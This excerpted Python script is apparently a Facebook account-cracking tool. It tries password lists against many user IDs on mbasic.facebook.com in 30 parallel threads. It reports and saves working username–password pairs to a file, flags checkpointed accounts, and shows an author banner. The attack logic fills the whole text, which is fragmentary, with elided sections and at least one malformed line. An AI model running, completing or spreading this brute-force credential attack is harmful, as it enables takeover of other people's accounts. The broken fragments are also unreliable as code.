...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;92m[Rehu] {loop}/{len(self.id)} [OK-{len(ok)}] [CP-{len(cp)}] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Rehu-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('Rehu_Ok.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Rehu-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[Rehu-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[Rehan] {loop}/{len(self.id)} OK-{len(ok)}] CP-{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
            ...
            print(54*"_")
            print("")
            with Rehanbrand(max_workers=30) as Armsty:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        Rehan.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
...
class __xnx__:
    ...
    def __pler__(self):
            ...
            print(54*"_")
            print("")
            with Rehanbrand(max_workers=30) as Rehan:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
banner = """  \033[1;32m_____      _  \n\033[1;33m |  __ \    | |  \n\033[1;37m | |__) |___| |__  _   _ \n\033[1;32m |  _  // _ \ '_ \| | | | \n\033[1;33m | | \ \  __/ | | | |_| | \n\033[1;37m |_|  \_\___|_| |_|\__,_|      \n\033[1;32m
               
\033[1;33m__________________________________________________

\033[1;32m [+] Author  : Rehan Brand 😎
\033[1;32m [+] Fb ID   :  Rehan Nawaz
\033[1;32m [+] Version : 8.0.0
\033[1;32m [+] Github  : Rehanbrand
\033[1;33m__________________________________________________
"""
ct = datetime.now()
n = ct.month
...
def dupcutter():
	...
	os.system('touch ' +Rehan)
	os.system('sort -r '+Rehan+' | uniq > '+Rehan)
	print("")
	print("")
	print(54*"\033[1;33m_")
	print("")
	print("[+] Removing Successful  From File " + Rehan )
	print("[+] New File Save " + Rehan )
	print(54*"\033[1;33m_")
	time.sleep(2)
